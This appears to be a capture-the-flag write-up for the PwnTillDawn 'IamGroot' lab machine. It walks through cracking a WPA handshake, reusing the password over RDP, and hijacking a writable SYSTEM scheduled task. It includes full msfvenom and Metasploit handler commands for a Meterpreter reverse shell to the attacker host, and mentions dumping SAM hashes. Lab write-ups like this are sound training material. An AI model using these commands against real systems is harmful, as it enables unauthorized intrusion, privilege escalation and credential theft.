---
layout: post
title: PwnTillDawn - IamGroot Write-Up
date: 2026-11-04
classes: wide
description: Cracking a WPA handshake and turning a writable scheduled task into SYSTEM

---

IamGroot (10.150.150.135)

## Scanning Phase

As usual, the first step is to scan the target and identify which services are exposed with both rustscan and nmap.

```sh
nmap -sV -sC -p22,80,135,139,445,3389,49667,49668 -Pn -oN scans/nmap.txt 10.150.150.135
```

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.9
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
```

The **RDP** certificate and the `rdp-ntlm-info` output name the host: **IAMGROOT**, `Product_Version: 10.0.14393`, so **Windows Server 2016** in a workgroup. No domain, no Active Directory, and the SMB fingerprint is enabled-but-not-required signing — interesting, but nothing to attack without credentials.

## A wireless capture behind IIS

Directory brute force with **ffuf** and `big.txt` returns one interesting hit:

```sh
ffuf -u http://10.150.150.135/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

```
admin   [Status: 301, Size: 151, Words: 9, Lines: 2]
```

`/admin` is not a management panel. It is a JavaScript page that **simulates an airodump-ng terminal**, "captures" a handshake, and offers the file for download. The terminal is theatre, but the artifact it hands over is real: `IamGrootWLAN.cap`, a genuine 802.11 capture.

## Cracking the handshake

```sh
aircrack-ng IamGrootWLAN.cap -w /usr/share/wordlists/rockyou.txt
```

The PSK is **rockyou**-weak, and that is the point of this machine: everything after this hinges on the Wi-Fi password being a password somebody would also use everywhere else. Inside the capture, the SSID is `IamGroot` and the BSSID is a locally-administered MAC — a software AP, not real hardware.

## A flag in the DNS

A capture holds more than a handshake. In **Wireshark** I applied the display filter `dns` and looked at the query names — one of them does not look like traffic:

```
79562af9...1f7955.flag31.com.schneiderpartner.ch
```

The flag is the leftmost label, which is the classic **DNS exfiltration** shape: data leaving the network as a query name, one label at a time. Redacted as `79562af9...` — the value is not the interesting part, the placement is.

## Reusing the PSK on the Windows side

The SSID is `IamGroot` and the machine is `IAMGROOT`, so the obvious username is `groot`. SMB refused the credential. RDP did not:

```sh
xfreerdp3 /d:'IAMGROOT' /u:'groot' /p:'' /v:10.150.150.135 /cert:ignore /size:95% +clipboard +drive:smbfolder,/home/CTF/PTD/135-IamGroot/
```

A desktop, and `FLAG1` sitting in plain sight (`7b5bd3a9...`). The `+drive` flag is worth remembering: it mounts a local folder inside the RDP session, which turns the rest of the box into a two-way file transfer without any other tool.

> ⚠️ **Important Note:** the same credential was denied by SMB and accepted by RDP. A refusal from one service is not a verdict on the password — it may only mean the account has no rights on that service. Collect a verdict per door before writing a credential off.

## The script that runs every five minutes

The desktop also holds a maintenance note about "interrupted calls" and a couple of capture files. The second capture is a filtered subset of the first one, so the whole VoIP story is a dead end — good flavour, no new traffic.

The real find is the scheduler:

```sh
schtasks /query /fo LIST /v
```

A task fires every **5 minutes** and runs:

```
C:\PTD\myscript.ps1
```

And `groot` can write to that script:

```sh
icacls C:\PTD\myscript.ps1
```

A writable script behind a recurring task means our code runs as the task's identity — here, `SYSTEM`. The trigger is the clock, not us.

### The payload

A plain reverse-shell one-liner planted in the script died the moment it connected and I had a hard time trying to understand why was this happening. Task Scheduler runs its action inside a **job object** and tears the whole process tree down when the action exits, so anything the script spawns dies with it. The callback is real; the lifetime is not.

The fix is a payload the handler can hold and the tick can re-arm, living in memory rather than on disk:

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f psh-reflection -o met.ps1
```

`-f psh-reflection` emits a PowerShell loader that allocates the shellcode and jumps into it, so no EXE ever lands on the target. Copy it over the RDP drive redirect into `C:\PTD\myscript.ps1`, then wait for the tick with the handler up:

```sh
msfconsole
```

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

A couple of minutes later — the tick, not latency — the session arrives:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

With SYSTEM, the local SAM is a `hashdump` away, and `FLAG13` (`df532f1e...`) is sitting on the Administrator desktop.

## The last flag was not a file

`FLAG21` was not on disk. Not by name, not by content, and not in either capture. It was in the registry:

```sh
reg query HKLM /s /f FLAG21
```

```
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SNMP\Parameters\RFC1156Agent
    sysLocation    REG_SZ    FLAG21=982e949d...
```

That key is where the **SNMP agent** stores its RFC1156 strings, and `sysLocation` is the MIB-II field `1.3.6.1.2.1.1.6`. The service itself was not answering on UDP `161`, so there was nothing to query over the network — the value existed in the configuration while the daemon gave no answer. Enumerating the registry is what got it. Still, I'm not convinced that was the intended method to acquire this flag.

## Lessons Learned

- `-p-` scans **TCP only**, so a UDP service is invisible to it; a pass over `161`, `137`, `500`, `123` is cheap. Here UDP `161` answered nothing at all — the flag sat in the service's configuration, not behind a live daemon — but the habit is what catches a live one next time.
- The password came from a different layer than the account it unlocked: a **WPA PSK** from a Wi-Fi capture became a Windows local account password. Cross-layer reuse is the connect-the-dots move of this machine.
- A writable script behind a recurring scheduled task is code execution as the **task's identity**. On a 5-minute trigger, a payload the tick can re-arm beats a one-shot raw shell every time.
- Flags do not have to be files: one was a query name inside a capture, the other a service configuration string. And check what services have **configured**, not only what is listening — the SNMP value was there while UDP `161` answered nothing at all.
- A refusal from one service is not a verdict on a credential — RDP and SMB disagreed about the same user, and RDP was right.

Hack on!
